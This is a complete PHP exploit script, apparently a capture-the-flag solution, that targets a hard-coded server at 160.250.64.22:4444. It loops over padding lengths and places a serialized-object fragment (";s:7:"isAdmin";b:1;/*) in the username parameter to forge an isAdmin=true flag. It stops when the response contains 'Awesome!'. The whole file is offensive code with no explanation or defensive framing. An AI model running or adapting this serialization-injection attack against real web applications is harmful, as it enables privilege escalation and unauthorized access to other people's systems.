<?php
function send_req($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $resp = curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$target = "http://160.250.64.22:4444/index.php";

for ($i = 1; $i <= 40; $i++) {
    $username = 'BlueCyber' . str_repeat('A',$i) . '";s:7:"isAdmin";b:1;/*';
    $password = '123';
    $url = $target . "?username=" . urlencode($username) . "&password=" . urlencode($password);

    echo "[*] Test $i\n";
    $resp = send_req($url);

    if ($resp !== false && strpos($resp, "Awesome!") !== false) {
        echo ">>> SUCCESS at i=$i\n";
        echo $resp . "\n";
        break;
    }
}
